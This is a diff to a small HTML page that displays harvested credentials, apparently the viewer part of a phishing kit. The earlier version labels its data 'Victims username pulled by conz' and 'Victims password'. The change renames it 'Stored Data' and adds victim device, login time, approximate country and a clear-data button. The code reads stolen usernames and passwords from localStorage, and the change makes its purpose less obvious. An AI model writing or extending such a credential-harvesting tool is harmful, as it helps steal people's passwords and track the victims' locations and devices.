@@ -7,7 +7,7 @@
     margin: 0;
     background: black;
     color: red;
-    font-family: Arial, sans-serif;
+    font-family: Arial;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -17,7 +17,7 @@
   .box {
     text-align: center;
     width: 90%;
-    max-width: 300px;
+    max-width: 350px;
   }
 
   h2 {
@@ -28,29 +28,61 @@
   }
 
   p {
-    margin: 15px 0;
-    font-size: 18px;
+    margin: 10px 0;
+    word-wrap: break-word;
+  }
+
+  button {
+    margin-top: 15px;
+    padding: 10px;
+    background: red;
+    color: black;
+    border: none;
+    cursor: pointer;
+    width: 100%;
   }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>Victims</h2>
+  <h2>Stored Data</h2>
 
   <p id="user"></p>
   <p id="pass"></p>
+  <p id="device"></p>
+  <p id="time"></p>
+  <p id="country"></p>
+
+  <button onclick="clearData()">Clear Data</button>
 </div>
 
 <script>
-  let user = localStorage.getItem("user");
-  let pass = localStorage.getItem("pass");
+let user = localStorage.getItem("user");
+let pass = localStorage.getItem("pass");
+let device = localStorage.getItem("device");
+let time = localStorage.getItem("time");
+let country = localStorage.getItem("country");
 
-  document.getElementById("user").innerText =
-    "Victims username pulled by conz: " + user;
+document.getElementById("user").innerText =
+  "Username pulled by conz: " + user;
 
-  document.getElementById("pass").innerText =
-    "Victims password pulled by conz: " + pass;
+document.getElementById("pass").innerText =
+  "Password pulled by conz: " + pass;
+
+document.getElementById("device").innerText =
+  "Device: " + device;
+
+document.getElementById("time").innerText =
+  "Login time: " + time;
+
+document.getElementById("country").innerText =
+  "Country (approx): " + country;
+
+function clearData() {
+  localStorage.clear();
+  location.reload();
+}
 </script>
 
 </body>
